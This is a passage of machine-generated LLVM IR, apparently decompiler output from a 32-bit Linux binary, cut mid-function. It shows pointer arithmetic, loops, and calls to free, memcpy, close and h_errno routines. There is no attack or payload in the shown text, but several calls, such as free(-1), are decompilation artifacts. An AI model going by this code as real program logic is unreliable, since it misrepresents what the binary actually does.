  %v2_805525e = add i32 %v0_805521b, 120
  %v3_805525e = inttoptr i32 %v2_805525e to i32*
  %v4_805525e = load i32, i32* %v3_805525e, align 4
  %v5_805525e = add i32 %v4_805525e, %v1_805525c
  store i32 %v5_805525e, i32* %eax.global-to-local, align 4
  %v2_8055262 = add i32 %v0_8055218, 36
  %v3_8055262 = inttoptr i32 %v2_8055262 to i32*
  store i32 %v5_805525e, i32* %v3_8055262, align 4
  %v0_8055265 = load i32, i32* @edi, align 4
  %v1_8055265 = add i32 %v0_8055265, 16
  %v2_8055265 = inttoptr i32 %v1_8055265 to i32*
  %v3_8055265 = load i32, i32* %v2_8055265, align 4
  %v1_8055268 = add i32 %v3_8055265, 4
  store i32 %v1_8055268, i32* %eax.global-to-local, align 4
  %v2_805526b = add i32 %v0_8055265, 36
  %v3_805526b = inttoptr i32 %v2_805526b to i32*
  %v4_805526b = load i32, i32* %v3_805526b, align 4
  %v7_805526b = mul i32 %v4_805526b, %v1_8055268
  store i32 %v7_805526b, i32* %eax.global-to-local, align 4
  %v2_805526f = add i32 %v0_8055265, 32
  %v3_805526f = inttoptr i32 %v2_805526f to i32*
  %v4_805526f = load i32, i32* %v3_805526f, align 4
  %v6_8055272 = icmp ugt i32 %v7_805526b, %v4_805526f
  br i1 %v6_8055272, label %dec_label_pc_805525a.dec_label_pc_80552e2.loopexit_crit_edge, label %dec_label_pc_8055274

dec_label_pc_805525a.dec_label_pc_80552e2.loopexit_crit_edge: ; preds = %dec_label_pc_805525a
  %v0_80552e2.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80552e2

dec_label_pc_8055274:                             ; preds = %dec_label_pc_805525a
  store i32 0, i32* %v3_805526b, align 4
  %v0_805527b = load i32, i32* @esp, align 4
  %v1_805527b = add i32 %v0_805527b, 27
  %v2_805527b = inttoptr i32 %v1_805527b to i8*
  store i8 0, i8* %v2_805527b, align 1
  %v1_80552cd.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80552cd

dec_label_pc_8055282:                             ; preds = %dec_label_pc_80551e1
  %v1_8055285 = add i32 %v0_80551c2, 132
  %v2_8055285 = inttoptr i32 %v1_8055285 to i32*
  %v3_8055285 = load i32, i32* %v2_8055285, align 4
  %v6_8055285 = inttoptr i32 %v0_80551c2 to i32*
  store i32 %v3_8055285, i32* %v6_8055285, align 4
  %v1_805528c = call i32 @free(i32 -1)
  store i32 %v1_805528c, i32* %eax.global-to-local, align 4
  %v0_8055291 = load i32, i32* @esp, align 4
  %v1_8055291 = add i32 %v0_8055291, 16
  %v1_8055294 = add i32 %v0_8055291, 260
  %v2_8055294 = inttoptr i32 %v1_8055294 to i32*
  %v3_8055294 = load i32, i32* %v2_8055294, align 4
  store i32 %v3_8055294, i32* %eax.global-to-local, align 4
  %v1_805529b = add i32 %v0_8055291, 136
  %v2_805529b = inttoptr i32 %v1_805529b to i32*
  %v3_805529b = load i32, i32* %v2_805529b, align 4
  %v15_805529b = icmp eq i32 %v3_805529b, %v3_8055294
  %v1_805529f = icmp eq i1 %v15_805529b, false
  br i1 %v1_805529f, label %dec_label_pc_80552cd, label %dec_label_pc_80552a1

dec_label_pc_80552a1:                             ; preds = %dec_label_pc_8055282
  %v0_80552a1 = load i32, i32* @edi, align 4
  %v1_80552a1 = add i32 %v0_80552a1, 16
  %v2_80552a1 = inttoptr i32 %v1_80552a1 to i32*
  %v3_80552a1 = load i32, i32* %v2_80552a1, align 4
  store i32 %v3_80552a1, i32* %eax.global-to-local, align 4
  %v2_80552a4 = add i32 %v0_8055291, 148
  %v3_80552a4 = inttoptr i32 %v2_80552a4 to i32*
  %v4_80552a4 = load i32, i32* %v3_80552a4, align 4
  %v15_80552a4 = icmp eq i32 %v3_80552a1, %v4_80552a4
  %v1_80552ab = icmp eq i1 %v15_80552a4, false
  br i1 %v1_80552ab, label %dec_label_pc_8055367, label %dec_label_pc_80552b1

dec_label_pc_80552b1:                             ; preds = %dec_label_pc_80552a1
  %v0_80552b1 = load i32, i32* @edx, align 4
  %v2_80552b1 = add i32 %v0_8055291, 12
  %v3_80552b1 = inttoptr i32 %v2_80552b1 to i32*
  store i32 %v0_80552b1, i32* %v3_80552b1, align 4
  %v0_80552b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80552b2 = add i32 %v0_8055291, 8
  %v3_80552b2 = inttoptr i32 %v2_80552b2 to i32*
  store i32 %v0_80552b2, i32* %v3_80552b2, align 4
  %v1_80552b3 = add i32 %v0_8055291, 152
  %v2_80552b3 = inttoptr i32 %v1_80552b3 to i32*
  %v3_80552b3 = load i32, i32* %v2_80552b3, align 4
  %v5_80552b3 = add i32 %v0_8055291, 4
  %v6_80552b3 = inttoptr i32 %v5_80552b3 to i32*
  store i32 %v3_80552b3, i32* %v6_80552b3, align 4
  %v0_80552ba = load i32, i32* %eax.global-to-local, align 4
  %v1_80552ba = load i32, i32* @edi, align 4
  %v2_80552ba = add i32 %v1_80552ba, 36
  %v3_80552ba = inttoptr i32 %v2_80552ba to i32*
  %v4_80552ba = load i32, i32* %v3_80552ba, align 4
  %v7_80552ba = mul i32 %v4_80552ba, %v0_80552ba
  store i32 %v7_80552ba, i32* %eax.global-to-local, align 4
  %v2_80552be = add i32 %v1_80552ba, 28
  %v3_80552be = inttoptr i32 %v2_80552be to i32*
  %v4_80552be = load i32, i32* %v3_80552be, align 4
  %v5_80552be = add i32 %v4_80552be, %v7_80552ba
  store i32 %v5_80552be, i32* %eax.global-to-local, align 4
  %v3_80552c1 = inttoptr i32 %v0_8055291 to i32*
  store i32 %v5_80552be, i32* %v3_80552c1, align 4
  %v5_80552c2 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8054e00, i32 %v3_8054e5f)
  store i32 %v5_80552c2, i32* %eax.global-to-local, align 4
  %v0_80552c7 = load i32, i32* @edi, align 4
  %v1_80552c7 = add i32 %v0_80552c7, 36
  %v2_80552c7 = inttoptr i32 %v1_80552c7 to i32*
  %v3_80552c7 = load i32, i32* %v2_80552c7, align 4
  %v4_80552c7 = add i32 %v3_80552c7, 1
  store i32 %v4_80552c7, i32* %v2_80552c7, align 4
  br label %dec_label_pc_80552ca

dec_label_pc_80552ca:                             ; preds = %dec_label_pc_805524e, %dec_label_pc_80552b1
  %v0_80552ca = load i32, i32* @esp, align 4
  %v1_80552ca = add i32 %v0_80552ca, 16
  br label %dec_label_pc_80552cd

dec_label_pc_80552cd:                             ; preds = %dec_label_pc_8055282, %dec_label_pc_8055274, %dec_label_pc_80552ca
  %v1_80552cd = phi i32 [ %v1_8055291, %dec_label_pc_8055282 ], [ %v1_80552cd.pre, %dec_label_pc_8055274 ], [ %v1_80552ca, %dec_label_pc_80552ca ]
  %v0_80552cd = load i32, i32* @esi, align 4
  %v2_80552cd = add i32 %v1_80552cd, 52
  %v3_80552cd = inttoptr i32 %v2_80552cd to i32*
  %v4_80552cd = load i32, i32* %v3_80552cd, align 4
  %v5_80552cd = add i32 %v4_80552cd, %v0_80552cd
  store i32 %v5_80552cd, i32* @esi, align 4
  %v0_80552d1 = load i32, i32* @ebx, align 4
  %v1_80552d1 = add i32 %v0_80552d1, 1
  store i32 %v1_80552d1, i32* @ebx, align 4
  %v2_80552d2 = add i32 %v1_80552cd, 104
  %v3_80552d2 = inttoptr i32 %v2_80552d2 to i32*
  %v4_80552d2 = load i32, i32* %v3_80552d2, align 4
  %v5_80552d2 = sub i32 %v1_80552d1, %v4_80552d2
  %v11_80552d2 = xor i32 %v4_80552d2, %v1_80552d1
  %v12_80552d2 = xor i32 %v5_80552d2, %v1_80552d1
  %v13_80552d2 = and i32 %v12_80552d2, %v11_80552d2
  %v14_80552d2 = icmp slt i32 %v13_80552d2, 0
  %v16_80552d2 = icmp slt i32 %v5_80552d2, 0
  %v2_80552d6 = icmp eq i1 %v16_80552d2, %v14_80552d2
  br i1 %v2_80552d6, label %dec_label_pc_80552e2, label %dec_label_pc_80552d8

dec_label_pc_80552d8:                             ; preds = %dec_label_pc_80552d8.lr.ph, %dec_label_pc_80552cd
  %v0_80552d8 = phi i32 [ %v0_80552d8.pre, %dec_label_pc_80552d8.lr.ph ], [ %v5_80552cd, %dec_label_pc_80552cd ]
  %v0_80551ae81 = phi i32 [ %v1_80552d2.pre, %dec_label_pc_80552d8.lr.ph ], [ %v1_80552cd, %dec_label_pc_80552cd ]
  %v2_80552d8 = add i32 %v0_80551ae81, 16
  %v3_80552d8 = inttoptr i32 %v2_80552d8 to i32*
  %v4_80552d8 = load i32, i32* %v3_80552d8, align 4
  %v5_80552d8 = sub i32 %v0_80552d8, %v4_80552d8
  %v11_80552d8 = xor i32 %v4_80552d8, %v0_80552d8
  %v12_80552d8 = xor i32 %v5_80552d8, %v0_80552d8
  %v13_80552d8 = and i32 %v12_80552d8, %v11_80552d8
  %v14_80552d8 = icmp slt i32 %v13_80552d8, 0
  %v16_80552d8 = icmp slt i32 %v5_80552d8, 0
  %v2_80552dc = icmp eq i1 %v16_80552d8, %v14_80552d8
  br i1 %v2_80552dc, label %dec_label_pc_80552e2, label %dec_label_pc_80551ae

dec_label_pc_80552e2:                             ; preds = %dec_label_pc_80551d1, %dec_label_pc_80551a2, %dec_label_pc_80552cd, %dec_label_pc_8055223, %dec_label_pc_8055237, %dec_label_pc_80552d8, %dec_label_pc_805525a.dec_label_pc_80552e2.loopexit_crit_edge
  %v0_80552e2 = phi i32 [ %v0_80552e2.pre.pre, %dec_label_pc_805525a.dec_label_pc_80552e2.loopexit_crit_edge ], [ %v1_80552d2.pre, %dec_label_pc_80551a2 ], [ %v1_80552cd, %dec_label_pc_80552cd ], [ %v1_805521b, %dec_label_pc_8055223 ], [ %v1_805521b, %dec_label_pc_8055237 ], [ %v0_80551ae81, %dec_label_pc_80552d8 ], [ %v1_80551c2, %dec_label_pc_80551d1 ]
  %v1_80552e5 = add i32 %v0_80552e2, 20
  %v2_80552e5 = inttoptr i32 %v1_80552e5 to i32*
  %v3_80552e5 = load i32, i32* %v2_80552e5, align 4
  %v5_80552e5 = add i32 %v0_80552e2, -16
  %v6_80552e5 = inttoptr i32 %v5_80552e5 to i32*
  store i32 %v3_80552e5, i32* %v6_80552e5, align 4
  %v1_80552e9 = call i32 @__libc_close(i32 -1)
  store i32 %v1_80552e9, i32* %eax.global-to-local, align 4
  %v0_80552ee = load i32, i32* @esp, align 4
  %v1_80552f1 = add i32 %v0_80552ee, 272
  %v2_80552f1 = inttoptr i32 %v1_80552f1 to i32*
  %v3_80552f1 = load i32, i32* %v2_80552f1, align 4
  %v4_80552f1 = icmp eq i32 %v3_80552f1, 0
  br i1 %v4_80552f1, label %dec_label_pc_8055306, label %dec_label_pc_80552fb

dec_label_pc_80552fb:                             ; preds = %dec_label_pc_80552e2
  store i32 %v3_80552f1, i32* %edx.global-to-local, align 4
  %v2_8055302 = inttoptr i32 %v3_80552f1 to i32*
  store i32 %v2_8054d72, i32* %v2_8055302, align 4
  %v0_8055312.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055312

dec_label_pc_8055306:                             ; preds = %dec_label_pc_80552e2
  %v3_8055309 = inttoptr i32 %v0_80552ee to i32*
  store i32 %v2_8054d72, i32* %v3_8055309, align 4
  %v1_805530a = call i32 @free(i32 -1)
  store i32 %v1_805530a, i32* %eax.global-to-local, align 4
  %v0_805530f = load i32, i32* @esp, align 4
  %v1_805530f = add i32 %v0_805530f, 16
  br label %dec_label_pc_8055312

dec_label_pc_8055312:                             ; preds = %dec_label_pc_80552fb, %dec_label_pc_8055306
  %v0_8055312 = phi i32 [ %v0_8055312.pre, %dec_label_pc_80552fb ], [ %v1_805530f, %dec_label_pc_8055306 ]
  %v1_8055315 = add i32 %v0_8055312, 12
  %v2_8055315 = inttoptr i32 %v1_8055315 to i32*
  %v3_8055315 = load i32, i32* %v2_8055315, align 4
  %v5_8055315 = add i32 %v0_8055312, -16
  %v6_8055315 = inttoptr i32 %v5_8055315 to i32*
  store i32 %v3_8055315, i32* %v6_8055315, align 4
  %v1_8055319 = call i32 @free(i32 -1)
  store i32 %v1_8055319, i32* @eax, align 4
  %v0_805531e = load i32, i32* @esp, align 4
  %v1_8055321 = add i32 %v0_805531e, 8
  %v2_8055321 = inttoptr i32 %v1_8055321 to i32*
  store i32 ptrtoint (i8** @global_var_80677e8.787 to i32), i32* %v2_8055321, align 4
  %v1_8055326 = add i32 %v0_805531e, 4
  %v2_8055326 = inttoptr i32 %v1_8055326 to i32*
  store i32 134560279, i32* %v2_8055326, align 4
  %v1_805532b = add i32 %v0_805531e, 200
  store i32 %v1_805532b, i32* %ebx.global-to-local, align 4
  %v3_8055332 = inttoptr i32 %v0_805531e to i32*
  store i32 %v1_805532b, i32* %v3_8055332, align 4
  %v2_8055333 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8054e00)
  store i32 %v2_8055333, i32* %eax.global-to-local, align 4
  %v0_8055338 = load i32, i32* @esp, align 4
  %v1_8055338 = inttoptr i32 %v0_8055338 to i32*
  store i32 ptrtoint (i8** @global_var_80677e8.787 to i32), i32* %v1_8055338, align 4
  %v1_805533f = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_805533f, i32* %eax.global-to-local, align 4
  %v0_8055344 = load i32, i32* @esp, align 4
  %v1_8055344 = add i32 %v0_8055344, 56
  %v2_8055344 = inttoptr i32 %v1_8055344 to i32*
  %v3_8055344 = load i32, i32* %v2_8055344, align 4
  store i32 %v3_8055344, i32* @eax, align 4
  %v1_8055348 = add i32 %v0_8055344, 72
  %v2_8055348 = inttoptr i32 %v1_8055348 to i32*
  %v3_8055348 = load i32, i32* %v2_8055348, align 4
  store i32 %v3_8055348, i32* %edx.global-to-local, align 4
  %v1_805534c = inttoptr i32 %v0_8055344 to i32*
  %v3_805534c = add i32 %v0_8055344, 4
  %v1_805534d = inttoptr i32 %v3_805534c to i32*
  store i32 1, i32* %v1_805534d, align 4
  %v0_8055350 = load i32, i32* @eax, align 4
  %v1_8055350 = sext i32 %v0_8055350 to i64
  store i64 %v1_8055350, i64* @global_var_8067800.788, align 2048
  %v0_8055355 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055355 = trunc i32 %v0_8055355 to i16
  store i16 %v1_8055355, i16* @global_var_8061544.789, align 4
  %v0_805535c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805535c, i32* %v1_805534c, align 4
  %v2_805535d = call i32 @__pthread_return_void(i32 -1, i32 %v15_8054e00)
  store i32 %v2_805535d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805549e

dec_label_pc_8055367:                             ; preds = %dec_label_pc_80552a1
  %v1_805536a = inttoptr i32 %v0_80552a1 to i32*
  %v2_805536a = load i32, i32* %v1_805536a, align 4
  %v5_805536a = inttoptr i32 %v0_8055291 to i32*
  store i32 %v2_805536a, i32* %v5_805536a, align 4
  %v1_805536c = call i32 @free(i32 -1)
  store i32 %v1_805536c, i32* @eax, align 4
  %v0_8055371 = load i32, i32* @esp, align 4
  %v1_8055371 = add i32 %v0_8055371, 16
  br label %dec_label_pc_8055374

dec_label_pc_8055374:                             ; preds = %dec_label_pc_80550a6, %dec_label_pc_80551d1, %dec_label_pc_80551c9, %dec_label_pc_8055165, %dec_label_pc_80550eb, %dec_label_pc_80550c7, %dec_label_pc_8055367
  %v1_805537b = phi i32 [ %v1_80550bb, %dec_label_pc_80550a6 ], [ %v1_80551c2, %dec_label_pc_80551d1 ], [ %v1_80551c2, %dec_label_pc_80551c9 ], [ %v1_80550dc, %dec_label_pc_8055165 ], [ %v1_80550dc, %dec_label_pc_80550eb ], [ %v1_80550dc, %dec_label_pc_80550c7 ], [ %v1_8055371, %dec_label_pc_8055367 ]
  %v1_8055374 = add i32 %v1_805537b, 51
  %v2_8055374 = inttoptr i32 %v1_8055374 to i8*
  %v3_8055374 = load i8, i8* %v2_8055374, align 1
  %v4_8055374 = icmp eq i8 %v3_8055374, 0
  %v1_8055379 = icmp eq i1 %v4_8055374, false
  br i1 %v1_8055379, label %dec_label_pc_80553bf, label %dec_label_pc_805537b

dec_label_pc_805537b:                             ; preds = %dec_label_pc_8055374
  %v0_805537b = load i32, i32* @ecx, align 4
  %v2_805537b = add i32 %v1_805537b, -4
  %v3_805537b = inttoptr i32 %v2_805537b to i32*
  store i32 %v0_805537b, i32* %v3_805537b, align 4
  %v1_805537c = add i32 %v1_805537b, -8
  %v2_805537c = inttoptr i32 %v1_805537c to i32*
  store i32 ptrtoint (i32* @global_var_8061548.726 to i32), i32* %v2_805537c, align 4
  %v1_8055381 = add i32 %v1_805537b, -12
  %v2_8055381 = inttoptr i32 %v1_8055381 to i32*
  store i32 134560279, i32* %v2_8055381, align 4
  %v1_8055386 = add i32 %v1_805537b, 184
  store i32 %v1_8055386, i32* @esi, align 4
  %v2_805538d = add i32 %v1_805537b, -16
  %v3_805538d = inttoptr i32 %v2_805538d to i32*
  store i32 %v1_8055386, i32* %v3_805538d, align 4
  %v2_805538e = call i32 @__pthread_return_void(i32 -1, i32 %v15_8054e00)
  store i32 %v2_805538e, i32* %eax.global-to-local, align 4
  %v0_8055393 = load i32, i32* @esp, align 4
  %v1_8055393 = inttoptr i32 %v0_8055393 to i32*
  store i32 ptrtoint (i32* @global_var_8061548.726 to i32), i32* %v1_8055393, align 4
  %v1_805539a = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_805539a, i32* %eax.global-to-local, align 4
  %v0_805539f = load i32, i32* @esp, align 4
  %v1_805539f = inttoptr i32 %v0_805539f to i32*
  %v2_805539f = load i32, i32* %v1_805539f, align 4
  store i32 %v2_805539f, i32* @eax, align 4
  %v3_805539f = add i32 %v0_805539f, 4
  %v1_80553a0 = inttoptr i32 %v3_805539f to i32*
  %v2_80553a0 = load i32, i32* %v1_80553a0, align 4
  store i32 %v2_80553a0, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_80553a0, align 4
  %v0_80553a3 = load i32, i32* @esi, align 4
  store i32 %v0_80553a3, i32* %v1_805539f, align 4
  %v0_80553a4 = load i32, i32* @global_var_8067c38.790, align 8
  store i32 %v0_80553a4, i32* %ebx.global-to-local, align 4
  %v2_80553aa = call i32 @__pthread_return_void(i32 -1, i32 %v15_8054e00)
  store i32 %v2_80553aa, i32* %eax.global-to-local, align 4
  %v0_80553af = load i32, i32* @esp, align 4
  %v1_80553af = add i32 %v0_80553af, 16
  %v1_80553b2 = add i32 %v0_80553a4, -1
  store i32 %v1_80553b2, i32* @ebx, align 4
  %v1_80553b3 = add i32 %v0_80553af, 52
  %v2_80553b3 = inttoptr i32 %v1_80553b3 to i32*
  %v3_80553b3 = load i32, i32* %v2_80553b3, align 4
  %v5_80553b3 = sub i32 %v3_80553b3, %v1_80553b2
  %v11_80553b3 = xor i32 %v3_80553b3, %v1_80553b2
  %v12_80553b3 = xor i32 %v5_80553b3, %v3_80553b3
  %v13_80553b3 = and i32 %v12_80553b3, %v11_80553b3
  %v14_80553b3 = icmp slt i32 %v13_80553b3, 0
  %v16_80553b3 = icmp slt i32 %v5_80553b3, 0
  %v2_80553b7 = icmp eq i1 %v16_80553b3, %v14_80553b3
  br i1 %v2_80553b7, label %dec_label_pc_80553bf, label %dec_label_pc_80553b9

dec_label_pc_80553b9:                             ; preds = %dec_label_pc_805537b
  %v4_80553b9 = add i32 %v3_80553b3, 1
  store i32 %v4_80553b9, i32* %v2_80553b3, align 4
  br label %dec_label_pc_80553e0.backedge

dec_label_pc_80553bf:                             ; preds = %dec_label_pc_8055048, %dec_label_pc_805537b, %dec_label_pc_8055374, %dec_label_pc_805505f
  %v1_80553cc = phi i32 [ %v1_80553af, %dec_label_pc_805537b ], [ %v1_805537b, %dec_label_pc_8055374 ], [ %v1_805509b, %dec_label_pc_805505f ], [ %v0_80553bf.pre, %dec_label_pc_8055048 ]
  %v1_80553bf = add i32 %v1_80553cc, 40
  %v2_80553bf = inttoptr i32 %v1_80553bf to i32*
  %v3_80553bf = load i32, i32* %v2_80553bf, align 4
  %v1_80553c3 = add i32 %v3_80553bf, 1
  store i32 %v1_80553c3, i32* %eax.global-to-local, align 4
  %v1_80553c4 = ashr i32 %v1_80553c3, 31
  store i32 %v1_80553c4, i32* %edx.global-to-local, align 4
  %v1_80553c5 = add i32 %v1_80553cc, 248
  %v2_80553c5 = inttoptr i32 %v1_80553c5 to i32*
  %v3_80553c5 = load i32, i32* %v2_80553c5, align 4
  %v5_80553c5 = zext i32 %v1_80553c3 to i64
  %v7_80553c5 = zext i32 %v1_80553c4 to i64
  %v8_80553c5 = mul nuw i64 %v7_80553c5, 4294967296
  %v9_80553c5 = or i64 %v8_80553c5, %v5_80553c5
  %v10_80553c5 = zext i32 %v3_80553c5 to i64
  %v11_80553c5 = sdiv i64 %v9_80553c5, %v10_80553c5
  %v12_80553c5 = trunc i64 %v11_80553c5 to i32
  store i32 %v12_80553c5, i32* %eax.global-to-local, align 4
  %v13_80553c5 = srem i64 %v9_80553c5, %v10_80553c5
  %v14_80553c5 = trunc i64 %v13_80553c5 to i32
  store i32 %v14_80553c5, i32* %edx.global-to-local, align 4
  store i32 %v14_80553c5, i32* %v2_80553bf, align 4
  %v1_80553d0 = icmp eq i32 %v14_80553c5, 0
  %v1_80553d2 = icmp eq i1 %v1_80553d0, false
  br i1 %v1_80553d2, label %dec_label_pc_80553d8, label %dec_label_pc_80553d4

dec_label_pc_80553d4:                             ; preds = %dec_label_pc_80553bf
  %v0_80553d4 = load i32, i32* @esp, align 4
  %v1_80553d4 = add i32 %v0_80553d4, 28
  %v2_80553d4 = inttoptr i32 %v1_80553d4 to i32*
  %v3_80553d4 = load i32, i32* %v2_80553d4, align 4
  %v4_80553d4 = add i32 %v3_80553d4, 1
  store i32 %v4_80553d4, i32* %v2_80553d4, align 4
  br label %dec_label_pc_80553d8

dec_label_pc_80553d8:                             ; preds = %dec_label_pc_80553bf, %dec_label_pc_80553d4
  %v0_80553d8 = load i32, i32* @esp, align 4
  %v1_80553d8 = add i32 %v0_80553d8, 36
  %v2_80553d8 = inttoptr i32 %v1_80553d8 to i32*
  store i32 -1, i32* %v2_80553d8, align 4
  br label %dec_label_pc_80553e0.backedge

dec_label_pc_80553e0.backedge:                    ; preds = %dec_label_pc_80553d8, %dec_label_pc_8055056, %dec_label_pc_8055144, %dec_label_pc_80553b9
  %v0_80553e0.pre = load i32, i32* @esp, align 4
  %v1_80553e0 = add i32 %v0_80553e0.pre, 28
  %v2_80553e0 = inttoptr i32 %v1_80553e0 to i32*
  %v3_80553e0 = load i32, i32* %v2_80553e0, align 4
  %tmp120 = icmp ult i32 %v3_80553e0, 3
  br i1 %tmp120, label %dec_label_pc_8054e40, label %dec_label_pc_8055405

dec_label_pc_8055405:                             ; preds = %dec_label_pc_8054dba, %dec_label_pc_8054e56, %dec_label_pc_8054f4a, %dec_label_pc_80553e0.backedge, %entry, %dec_label_pc_8054d94, %dec_label_pc_8054d9c, %dec_label_pc_8054daa
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_8054daa ], [ -1, %dec_label_pc_8054d9c ], [ -1, %dec_label_pc_8054d94 ], [ -1, %entry ], [ %v0_8054e07, %dec_label_pc_80553e0.backedge ], [ %v0_8054e07, %dec_label_pc_8054f4a ], [ %v0_8054e07, %dec_label_pc_8054e56 ], [ %v0_8054e07, %dec_label_pc_8054dba ]
  %v0_8055405 = call i32 @__GI___h_errno_location()
  store i32 %v0_8055405, i32* %eax.global-to-local, align 4
  %v1_805540a = inttoptr i32 %v0_8055405 to i32*
  store i32 -1, i32* %v1_805540a, align 4
  %v0_8055410 = load i32, i32* @esp, align 4
  %v1_8055410 = add i32 %v0_8055410, 44
  %v2_8055410 = inttoptr i32 %v1_8055410 to i32*
  %v3_8055410 = load i32, i32* %v2_8055410, align 4
  store i32 %v3_8055410, i32* %eax.global-to-local, align 4
  %v2_8055414 = add i32 %v0_8055410, 56
  %v3_8055414 = inttoptr i32 %v2_8055414 to i32*
  store i32 %v3_8055410, i32* %v3_8055414, align 4
  br label %dec_label_pc_8055418

dec_label_pc_8055418:                             ; preds = %dec_label_pc_805517d, %dec_label_pc_8055155, %dec_label_pc_8055405
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_8055405 ], [ %v0_8054e07, %dec_label_pc_805517d ], [ %v0_8054e07, %dec_label_pc_8055155 ]
  %v0_8055418 = load i32, i32* @esp, align 4
  %v1_8055418 = add i32 %v0_8055418, 20
  %v2_8055418 = inttoptr i32 %v1_8055418 to i32*
  %v3_8055418 = load i32, i32* %v2_8055418, align 4
  %v13_8055418 = icmp eq i32 %v3_8055418, -1
  br i1 %v13_8055418, label %dec_label_pc_8055418.dec_label_pc_805542e_crit_edge, label %dec_label_pc_805541f

dec_label_pc_8055418.dec_label_pc_805542e_crit_edge: ; preds = %dec_label_pc_8055418
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_805542e

dec_label_pc_805541f:                             ; preds = %dec_label_pc_8055418
  %v3_8055422 = load i32, i32* %v2_8055418, align 4
  %v5_8055422 = add i32 %v0_8055418, -16
  %v6_8055422 = inttoptr i32 %v5_8055422 to i32*
  store i32 %v3_8055422, i32* %v6_8055422, align 4
  %v1_8055426 = sext i16 %stack_var_-192.1 to i32
  %v2_8055426 = call i32 @__libc_close(i32 %v1_8055426)
  store i32 %v2_8055426, i32* %eax.global-to-local, align 4
  %v0_805542b = load i32, i32* @esp, align 4
  %v1_805542b = add i32 %v0_805542b, 16
  br label %dec_label_pc_805542e

dec_label_pc_805542e:                             ; preds = %dec_label_pc_8055418.dec_label_pc_805542e_crit_edge, %dec_label_pc_805541f
  %v1_8055435.pre-phi = phi i32 [ %.pre, %dec_label_pc_8055418.dec_label_pc_805542e_crit_edge ], [ %v1_8055426, %dec_label_pc_805541f ]
  %v0_805542e = phi i32 [ %v0_8055418, %dec_label_pc_8055418.dec_label_pc_805542e_crit_edge ], [ %v1_805542b, %dec_label_pc_805541f ]
  %v1_8055431 = add i32 %v0_805542e, 12
  %v2_8055431 = inttoptr i32 %v1_8055431 to i32*
  %v3_8055431 = load i32, i32* %v2_8055431, align 4
  %v5_8055431 = add i32 %v0_805542e, -16
  %v6_8055431 = inttoptr i32 %v5_8055431 to i32*
  store i32 %v3_8055431, i32* %v6_8055431, align 4
  %v2_8055435 = call i32 @free(i32 %v1_8055435.pre-phi)
  store i32 %v2_8055435, i32* %eax.global-to-local, align 4
  %v1_805543a = load i32, i32* @esp, align 4
  %v2_805543a = inttoptr i32 %v1_805543a to i32*
  store i32 %v2_8054d72, i32* %v2_805543a, align 4
  %v2_805543d = call i32 @free(i32 %v1_8055435.pre-phi)
  store i32 %v2_805543d, i32* @eax, align 4
  %v0_8055442 = load i32, i32* @esp, align 4
  %v1_8055445 = add i32 %v0_8055442, 32
  %v2_8055445 = inttoptr i32 %v1_8055445 to i32*
  store i32 -1, i32* %v2_8055445, align 4
  %v0_805544d = load i32, i32* @esp, align 4
  %v1_805544d = add i32 %v0_805544d, 40
  %v2_805544d = inttoptr i32 %v1_805544d to i32*
  %v3_805544d = load i32, i32* %v2_805544d, align 4
  %v13_805544d = icmp eq i32 %v3_805544d, -1
  br i1 %v13_805544d, label %dec_label_pc_80554a1, label %dec_label_pc_8055454

dec_label_pc_8055454:                             ; preds = %dec_label_pc_805542e
  %v0_8055454 = load i32, i32* @ecx, align 4
  %v2_8055454 = add i32 %v0_805544d, -4
  %v3_8055454 = inttoptr i32 %v2_8055454 to i32*
  store i32 %v0_8055454, i32* %v3_8055454, align 4
  %v1_8055455 = add i32 %v0_805544d, -8
  %v2_8055455 = inttoptr i32 %v1_8055455 to i32*
  store i32 ptrtoint (i8** @global_var_80677e8.787 to i32), i32* %v2_8055455, align 4
  %v1_805545a = add i32 %v0_805544d, -12
  %v2_805545a = inttoptr i32 %v1_805545a to i32*
  store i32 134560279, i32* %v2_805545a, align 4
  %v1_805545f = add i32 %v0_805544d, 184
  store i32 %v1_805545f, i32* %ebx.global-to-local, align 4
  %v2_8055466 = add i32 %v0_805544d, -16
  %v3_8055466 = inttoptr i32 %v2_8055466 to i32*
  store i32 %v1_805545f, i32* %v3_8055466, align 4
  %v3_8055467 = call i32 @__pthread_return_void(i32 %v1_8055435.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8055467, i32* %eax.global-to-local, align 4
  %v0_805546c = load i32, i32* @esp, align 4
  %v1_805546c = inttoptr i32 %v0_805546c to i32*
  store i32 ptrtoint (i8** @global_var_80677e8.787 to i32), i32* %v1_805546c, align 4
  %v2_8055473 = call i32 @__pthread_return_0(i32 %v1_8055435.pre-phi)
  store i32 %v2_8055473, i32* %eax.global-to-local, align 4
  %v0_8055478 = load i32, i32* @esp, align 4
  %v1_8055478 = add i32 %v0_8055478, 56
  %v2_8055478 = inttoptr i32 %v1_8055478 to i32*
  %v3_8055478 = load i32, i32* %v2_8055478, align 4
  store i32 %v3_8055478, i32* %edx.global-to-local, align 4
  %v1_805547c = add i32 %v0_8055478, 72
  %v2_805547c = inttoptr i32 %v1_805547c to i32*
  %v3_805547c = load i32, i32* %v2_805547c, align 4
  store i32 %v3_805547c, i32* %eax.global-to-local, align 4
  %v1_8055480 = sext i32 %v3_8055478 to i64
  store i64 %v1_8055480, i64* @global_var_8067800.788, align 2048
  %v1_8055486 = trunc i32 %v3_805547c to i16
  store i16 %v1_8055486, i16* @global_var_8061544.789, align 4
  %v1_805548c = inttoptr i32 %v0_8055478 to i32*
  %v2_805548c = load i32, i32* %v1_805548c, align 4
  store i32 %v2_805548c, i32* @eax, align 4
  %v3_805548c = add i32 %v0_8055478, 4
  %v1_805548d = inttoptr i32 %v3_805548c to i32*
  %v2_805548d = load i32, i32* %v1_805548d, align 4
